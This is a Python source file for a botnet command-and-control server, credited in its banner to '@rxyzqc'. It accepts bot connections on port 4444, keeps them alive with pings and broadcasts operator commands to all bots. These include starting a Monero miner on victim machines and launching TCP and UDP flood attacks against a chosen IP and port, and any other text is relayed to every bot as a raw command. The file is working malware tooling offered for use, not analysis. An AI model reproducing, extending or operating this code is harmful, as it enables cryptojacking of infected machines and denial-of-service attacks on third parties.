import threading
import socket
import time
import sys
import os

host = "127.0.0.1"
port = 4444

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.bind((host, port))

clients = []


class Color:
    purple = '\033[35m'
    green = '\033[32m'
    reset = '\033[0m'
    blue = '\033[96m'
    grey = '\033[90m'
    red = '\033[31m'


banner = """
                                           \033[35m_.oo.\033[90m
                   _.u[[/;:,.         \033[35m.odMMMMMM'\033[90m
                .o888UU[[[/;:-.  \033[35m.o@P^    MMM^\033[90m
               oN88888UU[[[/;::-.        \033[35mdP^\033[90m
              dNMMNN888UU[[[/;:--.   \033[35m.o@P^\033[90m
             ,MMMMMMN888UU[[/;::-. \033[35mo@^\033[90m
             NNMMMNN888UU[[[/~.\033[35mo@P^\033[90m
             888888888UU[[[/\033[35mo@^\033[90m-..
            \033[35mo\033[90mI8888UU[[[/\033[35mo@P^\033[90m:--..
         \033[35m.@^\033[90m  YUU[[[/\033[35mo@^\033[90m;::---..
       \033[35moMP\033[90m     ^/\033[35mo@P^\033[90m;:::---..
    \033[35m.dMMM    .o@^\033[90m ^;::---...
   \033[35mdMMMMMMM@^`\033[90m       `^^^^
  \033[35mYMMMUP^\033[90m
   \033[35m^^\033[90m
                     \033[35m╔═══════════════╗
                     ║\033[90m C2 By \033[96m@rxyzqc \033[35m║
                     ╚═══════════════╝
\033[0m"""

help_menu = """\033[90m
  -/-\033[35m help \033[90m      -/-
  -/-\033[35m bots \033[90m      -/-
  -/-\033[35m clear \033[90m     -/-
  -/-\033[35m miner \033[90m     -/-
  -/-\033[35m methods \033[90m   -/-
  -/-\033[35m connect \033[90m   -/-
  -/-\033[35m disconnect \033[90m-/-
"""

methods = """\033[90m
  -/-\033[35m l4 tcp \033[90m     -/-
  -/-\033[35m l4 udp \033[90m     -/-
  
  -/-\033[35m l4 tcp stop \033[90m-/-
  -/-\033[35m l4 udp stop \033[90m-/-
"""

print(banner)

if sys.platform == "linux":
    import pwd

    username = pwd.getpwuid(os.getuid())[0]
else:
    username = os.getlogin()

hostname = socket.gethostname()

local = f"\033[35m[\033[90m{username}@{hostname} \033[90m~\033[35m]\033[96m$ \033[0m"
remote = local.replace(hostname, "Remote")


def listen():
    s.listen()

    while True:
        c, addr = s.accept()
        clients.append(c)


def title():
    while 1:
        if sys.platform != "linux":
            os.system(f"title bots: {len(clients)}")
            time.sleep(5)


def ping():
    while True:
        time.sleep(5)

        if len(clients) > 0:
            for client in clients:
                try:
                    client.sendall(b'ping')

                    if client.recv(1024).decode() != "pong":
                        clients.remove(client)

                except ConnectionError:
                    clients.remove(client)


t = threading.Thread(target=listen)
t.start()

t = threading.Thread(target=ping)
t.start()

t = threading.Thread(target=title)
t.start()


def server():
    # Local
    while True:
        console = input(local)

        if console == "help":
            print(help_menu)

        elif console == "bots":
            print("bots:", len(clients), "\n")

        elif console == "clear":
            clear()

        elif console == "methods":
            print(methods)

        elif console in ["l4 tcp", "l4 udp", "l4 tcp stop", "l4 udp stop", "disconnect"]:
            print("\033[31m[-]\033[0m You are not connected\n")

        # Remote
        elif console == "connect":
            if len(clients) > 0:
                print("\033[32m[+]\033[0m Connection established\n")

                while True:
                    console = input(remote)

                    if console == "help":
                        print(help_menu)

                    elif console == "bots":
                        print("bots:", len(clients), "\n")

                    elif console == "clear":
                        clear()

                    elif console == "methods":
                        print(methods)

                    elif console == "connect":
                        print("\033[31m[-]\033[0m You are already connected\n")

                    elif console == "disconnect":
                        print("\033[96m[*]\033[0m Disconnected\n")
                        server()

                    # Miner
                    elif console == "miner stop":
                        for client in clients:
                            client.sendall(console.encode())

                            print("\033[96m[*]\033[0m Miner stoped\n")

                    elif console.startswith("miner"):
                        if len(console.split()) == 4:
                            for client in clients:
                                client.sendall(console.encode())

                                print("\033[32m[+]\033[0m Miner started\n")
                        else:
                            print("Usage: miner <pool:port> <monero_wallet> <worker_name>\n")

                    # Methods
                    elif console == "l4 tcp stop":
                        for client in clients:
                            client.sendall(console.encode())

                            print("\033[96m[*]\033[0m L4 TCP Stoped\n")

                    elif console == "l4 udp stop":
                        for client in clients:
                            client.sendall(console.encode())

                            print("\033[96m[*]\033[0m L4 UDP Stoped\n")

                    elif console.startswith("l4 tcp"):
                        if len(console.split()) == 5:
                            for client in clients:
                                client.sendall(console.encode())

                                print("\033[96m[*]\033[0m L4 TCP Started\n")
                        else:
                            print("Usage: l4 tcp <ip> <port> <bytes>\n")

                    elif console.startswith("l4 udp"):
                        if len(console.split()) == 4:
                            for client in clients:
                                client.sendall(console.encode())

                                print("\033[96m[*]\033[0m L4 UDP Started\n")
                        else:
                            print("Usage: l4 udp <ip> <bytes>\n")

                    else:
                        for client in clients:
                            client.sendall(console.encode())
            else:
                print("\033[31m[-]\033[0m No online bots\n")

        else:
            os.system(console)


def clear():
    if sys.platform == "linux":
        os.system("clear")
    else:
        os.system("cls")

    print(banner)


server()
